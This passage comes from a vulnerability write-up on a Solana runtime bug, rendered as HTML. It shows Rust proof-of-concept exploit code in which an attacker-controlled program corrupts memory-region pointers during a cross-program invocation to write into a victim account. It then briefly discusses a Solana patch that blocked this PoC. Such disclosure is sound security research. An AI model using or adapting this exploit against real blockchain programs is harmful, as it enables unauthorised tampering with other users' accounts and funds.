</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">14</span><span>    </span><span class="token token" style="color:#e2777a">entrypoint</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">15</span><span>        </span><span class="token token" style="color:#cc99cd">self</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">16</span><span>        </span><span class="token token" style="color:#f8c555">ProgramResult</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">17</span><span>    </span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">18</span><span>    </span><span class="token token" style="color:#e2777a">pubkey</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Pubkey</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">19</span><span></span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">20</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">21</span><span></span><span class="token token macro" style="color:#f8c555">entrypoint!</span><span class="token token" style="color:#ccc">(</span><span>process_instruction</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">22</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">23</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">24</span><span></span><span class="token token" style="color:#999">// accounts[0] : LEVERAGE account controlled by ATTACKER and owned by EXPLOIT program </span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">25</span><span></span><span class="token token" style="color:#999">// accounts[1] : VICTIM account ATTACKER wants to modify</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">26</span><span></span><span class="token token" style="color:#999">// accounts[2] : BENIGN program that owns VICTIM account ATTACKER wants to modify</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">27</span><span></span><span class="token token" style="color:#cc99cd">pub</span><span> </span><span class="token token" style="color:#cc99cd">fn</span><span> </span><span class="token token function-definition" style="color:#f08d49">process_instruction</span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">28</span><span>    _program_id</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">Pubkey</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">29</span><span>    accounts</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#f8c555">AccountInfo</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">30</span><span>    _instruction_data</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">31</span><span></span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">-&gt;</span><span> </span><span class="token token" style="color:#f8c555">ProgramResult</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">32</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">33</span><span>    </span><span class="token token" style="color:#999">// trigger CoW here to prevent future issues</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">34</span><span>    accounts</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#f08d49">0</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span>data</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">borrow_mut</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#f08d49">10</span><span class="token token" style="color:#ccc">]</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#f08d49">2</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">35</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">36</span><span>    </span><span class="token token" style="color:#999">// copy data pointers to force the following cpi update_caller_account to update incorrect region</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">37</span><span>    </span><span class="token token" style="color:#cc99cd">unsafe</span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">38</span><span>        </span><span class="token token" style="color:#e2777a">ptr</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">copy</span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">39</span><span>            </span><span class="token token" style="color:#e2777a">mem</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">transmute</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">Rc</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">RefCell</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#67cdcc">&gt;&gt;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">const</span><span> </span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">40</span><span>                </span><span class="token token" style="color:#67cdcc">&amp;</span><span>accounts</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#f08d49">0</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span>data </span><span class="token token" style="color:#999">//LEVERAGE</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">41</span><span>            </span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">42</span><span>            </span><span class="token token" style="color:#e2777a">mem</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">transmute</span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">43</span><span>                </span><span class="token token" style="color:#e2777a">mem</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">transmute</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">Rc</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">RefCell</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#67cdcc">&gt;&gt;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">const</span><span> </span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">44</span><span>                    </span><span class="token token" style="color:#67cdcc">&amp;</span><span>accounts</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#f08d49">1</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span>data </span><span class="token token" style="color:#999">//VICTIM</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">45</span><span>                </span><span class="token token" style="color:#ccc">)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">46</span><span>            </span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">47</span><span>            </span><span class="token token" style="color:#e2777a">mem</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">size_of</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">Rc</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">RefCell</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#67cdcc">&gt;&gt;</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">48</span><span>        </span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">49</span><span>    </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">50</span><span>    </span><span class="token token" style="color:#f08d49">invoke_signed</span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">51</span><span>        </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">Instruction</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">new_with_bincode</span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">52</span><span>            accounts</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#f08d49">2</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span>key</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">clone</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">53</span><span>            </span><span class="token token" style="color:#7ec699">b&quot;&quot;</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">54</span><span>            </span><span class="token token macro" style="color:#f8c555">vec!</span><span class="token token" style="color:#ccc">[</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">55</span><span>                </span><span class="token token" style="color:#f8c555">AccountMeta</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">new</span><span class="token token" style="color:#ccc">(</span><span>accounts</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#f08d49">1</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span>key</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">clone</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f08d49">false</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">56</span><span>            </span><span class="token token" style="color:#ccc">]</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">57</span><span>        </span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">58</span><span>        </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#ccc">[</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">59</span><span>            accounts</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#f08d49">1</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">clone</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">60</span><span>        </span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">61</span><span>        </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">62</span><span>    </span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#67cdcc">?</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">63</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">64</span><span>    </span><span class="token token" style="color:#999">// this will write to accounts[1].data due to corrupted region.host_addr</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">65</span><span>    accounts</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#f08d49">0</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span>data</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">borrow_mut</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#f08d49">10</span><span class="token token" style="color:#ccc">]</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#f08d49">1</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">66</span><span>    </span><span class="token token" style="color:#f8c555">Ok</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">67</span><span></span><span class="token token" style="color:#ccc">}</span></code></div></div></pre>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">However, once we pulled the latest code, our PoC stopped working. How so?</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Coincidentally, Solana was actively patching another bug while we were developing our PoC. We originally thought the patch was irrelevant to our bug, but it ended up blocking our first exploit.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">The patch addresses a mistake where <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code> states are not updated properly across CPIs. That fix landed in <a class="text-white hover:text-glow transition-all duration-300 underline underline-offset-4 decoration-white/30 hover:decoration-white" target="_blank" rel="noopener noreferrer" href="https://github.com/solana-labs/solana/pull/32649/commits/9788a4efffdb1436bdcb5f0891111398d5a4da0b">this commit</a>. The main addition of the patch is shown below.</p>
<pre><div class="relative my-6 border border-white/10 bg-black/60"><div class="absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase">:: <!-- -->RUST</div><div class="rounded-sm !bg-transparent !m-0" style="color:#ccc;background:#0a0a0a;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;border:1px solid rgba(255, 255, 255, 0.15);box-shadow:0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px rgba(0, 0, 0, 0.5)"><code class="language-rust" style="white-space:pre;color:#e0e0e0;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">1</span><span class="token token" style="color:#cc99cd">fn</span><span> </span><span class="token token function-definition" style="color:#f08d49">update_caller_account_perms</span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">2</span><span>    memory_mapping</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">MemoryMapping</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">3</span><span>    caller_account</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">CallerAccount</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">4</span><span>    callee_account</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">BorrowedAccount</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;_</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">5</span><span>    is_loader_deprecated</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">bool</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">6</span><span></span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">-&gt;</span><span> </span><span class="token token" style="color:#f8c555">Result</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f8c555">Error</span><span class="token token" style="color:#67cdcc">&gt;</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">7</span><span>    </span><span class="token token" style="color:#cc99cd">let</span><span> </span><span class="token token" style="color:#f8c555">CallerAccount</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">8</span><span>        original_data_len</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">9</span><span>        vm_data_addr</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">10</span><span>        </span><span class="token token" style="color:#ccc">..</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">11</span><span>    </span><span class="token token" style="color:#ccc">}</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> caller_account</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">12</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">13</span><span>    </span><span class="token token" style="color:#cc99cd">let</span><span> data_region </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#f08d49">account_data_region</span><span class="token token" style="color:#ccc">(</span><span>memory_mapping</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span>vm_data_addr</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span>original_data_len</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#67cdcc">?</span><span class="token token" style="color:#ccc">;</span><span>
